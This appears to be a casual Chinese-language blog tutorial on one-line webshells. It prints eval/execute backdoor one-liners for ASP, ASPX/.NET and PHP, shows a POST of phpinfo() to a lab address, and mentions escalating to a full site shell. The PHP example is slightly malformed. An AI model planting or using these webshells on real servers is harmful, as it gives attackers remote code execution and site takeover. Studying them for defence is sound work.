[ PHP - Webshell ] 一句話木馬（上？）
PHP, Webshell

我們常看到人家說一句話木馬，那到底是什麼東西呢？
其實這東西的原型只是一個可以去執行 system call 或去接收惡意 User 傳內容的一個 function 罷了
當然啦，依照各種語言，其實都會有這種 function
例如 :

ASP 

 
<%execute request("vbs")%>

ASPX 

 
<%@ Page Language="Jscript"%><%eval(Request.Item["pass"],"unsafe");%>

.NET 

 
<%@ Page Language="Jscript"%><%Response.Write(eval(Request.Item["z"],"unsafe"));%>

為什麼都是用 ASP 系列當範例?
我才不會跟你講，是因為我討厭 asp 呢

(咳) 好啦，講正題
我們來講 PHP
在 PHP 裡的一句話原型可能是這樣的 

 
<?php eval($_GET[cmd]);>

來個實際範例 ：
首先我們來看一下 Code

你看，真的只有那樣 耶，我最喜歡的那隻水狼又出來惹 (X)

然後我們直接打開網址來看


可以發現內容是空白的，因為完全沒有 POST 東西 （廢話）

接著我們打開我的 Hackbar 在 POST 裡面打上我們剛剛的參數，接上來 send 出去 

 
http://10.10.1.181/b.php
POST => c=phpinfo();

你看，我們讓頁面出現了 phpinfo 了，那既然今天是出現 phpinfo，我們當然可以寫入其他東西，例如說上傳功能或直接讓小馬牽大馬，接著我們就可以直接把目標的整個網頁 get shell 下來了

嗯... 因為今天沒有特別想寫的東西，先寫到這邊好了
下次如果會繼續寫（如果有的話）可能來寫一下一句話的各種變形或示範把一句話藏在圖片中吧
